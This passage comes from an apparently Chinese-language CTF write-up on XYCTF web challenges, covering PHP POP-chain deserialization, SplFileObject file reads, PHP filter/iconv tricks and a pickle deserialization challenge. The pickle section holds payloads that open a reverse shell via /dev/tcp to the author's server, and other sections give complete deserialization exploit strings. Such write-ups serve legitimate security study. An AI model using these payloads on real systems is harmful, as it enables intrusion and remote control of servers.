class="variable language_">$this</span>-&gt;lao-&gt;chen;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;xxxxx&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;学到就是赚到!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$data</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;name!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;num!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;旅行者别忘记旅行的意义!&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>链子：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E::__wakeup<span class="punctuation">-&gt;</span>D::__tostring<span class="punctuation">-&gt;</span>B::__get<span class="punctuation">-&gt;</span>A::__invoke<span class="punctuation">-&gt;</span>C::__call</span><br></pre></td></tr></table></figure><p>poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mack</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$luo</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wang1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chen</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">E</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;num=<span class="keyword">new</span> <span class="title function_ invoke__">D</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;num-&gt;lao=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;num-&gt;lao-&gt;luo=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;num-&gt;lao-&gt;luo-&gt;mack=<span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//O:1:&quot;E&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;num&quot;;O:1:&quot;D&quot;:2:&#123;s:3:&quot;lao&quot;;O:1:&quot;B&quot;:1:&#123;s:3:&quot;luo&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;mack&quot;;O:1:&quot;C&quot;:1:&#123;s:5:&quot;wang1&quot;;N;&#125;&#125;&#125;s:4:&quot;chen&quot;;N;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>访问<code>/saber_master_saber_master.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Liu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$T1ng</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$upsw1ng</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$Liu</span>, <span class="variable">$T1ng</span>, <span class="variable">$upsw1ng</span> = Showmaker</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Liu = <span class="variable">$Liu</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;T1ng = <span class="variable">$T1ng</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;upsw1ng = <span class="variable">$upsw1ng</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$crypto0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$adwa</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$crypto0</span>, <span class="variable">$adwa</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;crypto0 = <span class="variable">$crypto0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">XYCTF</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;adwa-&gt;crypto0 != <span class="string">&#x27;dev1l&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;adwa-&gt;T1ng != <span class="string">&#x27;yuroandCMD258&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> False;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$KickyMu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fpclose</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$N1ght</span> = <span class="string">&quot;Crypto0&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$KickyMu</span>, <span class="variable">$fpclose</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;KickyMu = <span class="variable">$KickyMu</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fpclose = <span class="variable">$fpclose</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">XY</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;N1ght == <span class="string">&#x27;oSthing&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;WOW, You web is really good!!!\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_POST</span>[<span class="string">&#x27;X&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;Y&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;KickyMu-&gt;<span class="title function_ invoke__">XYCTF</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">XY</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;CTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;CTF&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>链子：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">XYCTFNO3</span><span class="symbol">:</span><span class="symbol">:__wakeup-&gt;XYCTFNO2</span><span class="symbol">:</span><span class="symbol">:XYCTF</span>()-&gt;<span class="variable constant_">XYCTFNO3</span><span class="symbol">:</span><span class="symbol">:XY</span>()</span><br></pre></td></tr></table></figure><p><code>$_POST[&#39;X&#39;]($_POST[&#39;Y&#39;]);</code>是利用点，用php的内置类SplFileObject来读取文件内容，由于没有输出，想要读取到文件里的内容要用伪协议，他毕竟说了flag.php，直接读就行了。</p><p>XYCTFNO1类的upsw1ng为私有变量，因为这里没有对其进行赋值，序列化后的字符串和它无关，所以不用管，但如果对其进行了赋值，因为是私有变量，序列化后变量中的类名前后会有空白符，而复制的时候会丢失，所以要在类名前后加上%00或者将其序列化后的字符串进行url编码</p><p>poc：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="string">?p</span>hp</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">XYCTFNO1</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Liu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$T1ng</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$upsw1ng</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">XYCTFNO2</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$crypto0</span>=<span class="string">&quot;dev1l&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$adwa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$T1ng</span>=<span class="string">&quot;yuroandCMD258&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">XYCTFNO3</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$KickyMu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fpclose</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$N1ght</span> = <span class="string">&quot;oSthing&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=new <span class="variable constant_">XYCTFNO3</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title class_">KickyMu</span>=new <span class="variable constant_">XYCTFNO2</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title class_">KickyMu</span>-&gt;adwa=new <span class="variable constant_">XYCTFNO2</span>();</span><br><span class="line">echo urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span><span class="symbol">O:</span><span class="number">8</span><span class="symbol">:<span class="string">&quot;XYCTFNO3&quot;</span></span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:</span>&#123;<span class="symbol">s:</span><span class="number">7</span><span class="symbol">:<span class="string">&quot;KickyMu&quot;</span></span>;<span class="symbol">O:</span><span class="number">8</span><span class="symbol">:<span class="string">&quot;XYCTFNO2&quot;</span></span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:</span>&#123;<span class="symbol">s:</span><span class="number">7</span><span class="symbol">:<span class="string">&quot;crypto0&quot;</span></span>;<span class="symbol">s:</span><span class="number">5</span><span class="symbol">:<span class="string">&quot;dev1l&quot;</span></span>;<span class="symbol">s:</span><span class="number">4</span><span class="symbol">:<span class="string">&quot;adwa&quot;</span></span>;<span class="symbol">O:</span><span class="number">8</span><span class="symbol">:<span class="string">&quot;XYCTFNO2&quot;</span></span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:</span>&#123;<span class="symbol">s:</span><span class="number">7</span><span class="symbol">:<span class="string">&quot;crypto0&quot;</span></span>;<span class="symbol">s:</span><span class="number">5</span><span class="symbol">:<span class="string">&quot;dev1l&quot;</span></span>;<span class="symbol">s:</span><span class="number">4</span><span class="symbol">:<span class="string">&quot;adwa&quot;</span></span>;N;<span class="symbol">s:</span><span class="number">4</span><span class="symbol">:<span class="string">&quot;T1ng&quot;</span></span>;<span class="symbol">s:</span><span class="number">13</span><span class="symbol">:<span class="string">&quot;yuroandCMD258&quot;</span></span>;&#125;<span class="symbol">s:</span><span class="number">4</span><span class="symbol">:<span class="string">&quot;T1ng&quot;</span></span>;<span class="symbol">s:</span><span class="number">13</span><span class="symbol">:<span class="string">&quot;yuroandCMD258&quot;</span></span>;&#125;<span class="symbol">s:</span><span class="number">7</span><span class="symbol">:<span class="string">&quot;fpclose&quot;</span></span>;N;<span class="symbol">s:</span><span class="number">5</span><span class="symbol">:<span class="string">&quot;N1ght&quot;</span></span>;<span class="symbol">s:</span><span class="number">7</span><span class="symbol">:<span class="string">&quot;oSthing&quot;</span></span>;&#125;</span><br></pre></td></tr></table></figure><p>故最终payload：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET传参:</span><br><span class="line">?CTF=O:<span class="number">8</span>:<span class="string">&quot;XYCTFNO3&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;KickyMu&quot;</span>;O:<span class="number">8</span>:<span class="string">&quot;XYCTFNO2&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;crypto0&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;dev1l&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;adwa&quot;</span>;O:<span class="number">8</span>:<span class="string">&quot;XYCTFNO2&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;crypto0&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;dev1l&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;adwa&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;T1ng&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;yuroandCMD258&quot;</span>;&#125;s:<span class="number">4</span>:<span class="string">&quot;T1ng&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;yuroandCMD258&quot;</span>;&#125;s:<span class="number">7</span>:<span class="string">&quot;fpclose&quot;</span>;N;s:<span class="number">5</span>:<span class="string">&quot;N1ght&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;oSthing&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">POST传参:</span><br><span class="line">X=SplFileObject&amp;Y=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h3 id="login（pickle反序列化）"><a href="#login（pickle反序列化）" class="headerlink" title="login（pickle反序列化）"></a>login（pickle反序列化）</h3><p><img src="https://bu.dusays.com/2024/06/05/6660865fb4c0d.png" alt="image-20240414134841575.png"></p><p>扫下目录发现有<code>register.php</code>，用于注册的，我注册了个账号密码都为1的，进去后</p><p><img src="https://bu.dusays.com/2024/06/05/6660865fb470d.png" alt="image-20240414134937941.png"></p><p>当时第一反应是看到hello world以为是ssti，然后测了下发现不是，然后注册用户名测waf，发现用户名为大小写r的时候，弹waf，说明过滤了大小写r</p><p><img src="https://bu.dusays.com/2024/06/05/6660865fb4c02.png" alt="image-20240414135132072.png"></p><p>很奇怪，所有数字字母就只过滤了r，这时没啥思路就抓了个包，发现cookie好像有东西</p><p><img src="https://bu.dusays.com/2024/06/05/6660865fbbd80.png" alt="image-20240414135327458.png"></p><p>把这个remember的值丢给gpt，gpt说这个字符串像是pickle反序列化后的字符串，但pickle反序列化不成功。想到之前只过滤了r，而刚好pickle反序列化中关于函数执行有三个重要的字节码：<code>R</code>、<code>i</code>、<code>o</code>中就有r，猜测remember的值就是pickle反序列化的入口</p><p>这里没有回显的地方，就想到用shell反弹，先是一个最基础的shell反弹，这个是R指令的</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span><span class="string">&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&quot;bash -c &#x27;</span>bash -i &gt;&amp; <span class="regexp">/dev/tcp</span><span class="regexp">/vps/port</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span><span class="string">&#x27;&quot;</span></span><br><span class="line"><span class="string">tR.</span></span><br></pre></td></tr></table></figure><p>上面测试是过滤了R的，用R指令也弹不了，那就换个指令，用i指令</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;(S&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1&#x27;&quot;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>还要base64编码下，毕竟人家那remember的值都是base64编码后的，估计后端语句还要进行一次base64转换，我看其他类似的ctf题都是base64解码后就能pickle反序列化成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a=<span class="string">&#x27;&#x27;&#x27;(S&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1&#x27;&quot;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(a.encode()))</span><br></pre></td></tr></table></figure><p>得到的结果要把b字节码和单引号去掉，成功弹shell</p><p><img src="https://bu.dusays.com/2024/06/05/666086a07eb60.png" alt="image-20240416230752762.png"></p><h3 id="ezClass（原生类SplFileObject读文件）"><a href="#ezClass（原生类SplFileObject读文件）" class="headerlink" title="ezClass（原生类SplFileObject读文件）"></a>ezClass（原生类SplFileObject读文件）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$aa</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;aa&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$bb</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;bb&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">((<span class="keyword">new</span> <span class="variable">$a</span>(<span class="variable">$aa</span>))-&gt;<span class="variable">$c</span>())((<span class="keyword">new</span> <span class="variable">$b</span>(<span class="variable">$bb</span>))-&gt;<span class="variable">$c</span>());</span><br></pre></td></tr></table></figure><p>本来想用原生类<code>DirectoryIterator</code>加glob协议遍历数组先看下当前目录的，但没法遍历，只能说运气好，flag就在名为flag的文件下，万一改个名字就寄，但其实<code>DirectoryIterator</code>加glob协议可以知道确实有个名为flag的文件</p><p><img src="https://bu.dusays.com/2024/06/05/666086a08f807.png" alt="image-20240415181248957.png"></p><p>毕竟如果不存在的话都不会回显的，比如a</p><p><img src="https://bu.dusays.com/2024/06/05/666086a08feb0.png" alt="image-20240415181504316.png"></p><p>payload</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=SplFileObject<span class="variable">&amp;aa</span>=/flag<span class="variable">&amp;c</span>=__toString</span><br></pre></td></tr></table></figure><h3 id="连连看到底是连连什么看（PHP-Base64-Filter构造rce）"><a href="#连连看到底是连连什么看（PHP-Base64-Filter构造rce）" class="headerlink" title="连连看到底是连连什么看（PHP Base64 Filter构造rce）"></a>连连看到底是连连什么看（PHP Base64 Filter构造rce）</h3><p>开题看源码啥都没有，附件有个<code>what&#39;s_this.php</code>，访问一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|=|php|file|:|\/|\?/i&quot;</span>, <span class="variable">$p</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;waf!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&quot;php://filter/<span class="subst">$p</span>/resource=/etc/passwd&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$payload</span>)===<span class="string">&quot;XYCTF&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这里要求的是读<code>/etc/passwd</code>文件，并且文件的内容要为<code>XYCTF</code>。所以我们就需要构造这个文件的内容为XYCTF，参考文章：<a href="https://tttang.com/archive/1395/">https://tttang.com/archive/1395/</a></p><p>这篇文章大概意思就是可以利用 PHP Base64 Filter 宽松的解析，通过 iconv filter 等编码组合构造出特定的 PHP 代码进而完成无需<strong>临时文件</strong>的 RCE。</p><p>PHP Filter 当中有一种 <code>convert.iconv</code> 的 Filter ，可以用来将数据从字符集 A 转换为字符集 B ，其中这两个字符集可以从 <code>iconv -l</code> 获得，而从一个字符集转换为另一个子符集时，由于编码规则不同，转换前后的字符有可能就会不同，就可能会产生一些原字符串没有的字符，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;php://filter/convert.iconv.UTF-8%2fUTF-7/resource=data:,some&lt;&gt;text&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="comment">// Output:</span></span><br><span class="line"><span class="comment">// some+ADwAPg-text</span></span><br></pre></td></tr></table></figure><p>甚至是不可见字符，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;php://filter/&quot;</span>;</span><br><span class="line"><span class="variable">$url</span> .= <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR&quot;</span>;</span><br><span class="line"><span class="variable">$url</span> .= <span class="string">&quot;/resource=data://,aaaaaaaaaaaaaa&quot;</span>;     <span class="comment">//我们这里简单使用 `data://` 来模拟文件内容读取，相当于题上的/etc/passwd</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>));</span><br><span class="line"><span class="comment">// Output:</span></span><br><span class="line"><span class="comment">// string(18) 